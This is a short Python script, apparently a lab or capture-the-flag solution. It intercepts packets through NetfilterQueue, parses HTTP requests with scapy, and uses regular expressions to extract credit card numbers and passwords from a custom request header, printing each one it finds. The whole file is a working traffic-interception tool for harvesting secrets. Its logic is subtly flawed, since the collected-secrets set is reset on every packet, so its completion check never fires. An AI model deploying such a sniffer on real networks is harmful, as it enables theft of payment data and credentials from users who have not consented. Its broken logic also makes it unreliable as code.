from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers import http
import re
import sys


def print_and_accept(pkt):
    packet = IP(pkt.get_payload())
    if packet.haslayer(http.HTTPRequest):
        data = packet[http.HTTPRequest].fields['Unknown_Headers']['secret'.encode()].decode()

        credit_card_pattern = re.compile('cc\s+---\s+((?:[0-9]{4}\.){3}[0-9]{4})')
        pass_pattern = re.compile('pwd\s+---\s+([0-9A-Z:;<=>?@]+)')

        secrets = set()

        sec = credit_card_pattern.findall(data) + pass_pattern.findall(data)
        if len(sec) > 0:
            print("New secret found: {}".format(sec[0]))
            secrets.add(sec[0])
        if len(secrets) >= 3:
            print("Found all secrets: {}".format(secrets))
            sys.exit()

    print(pkt)
    pkt.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
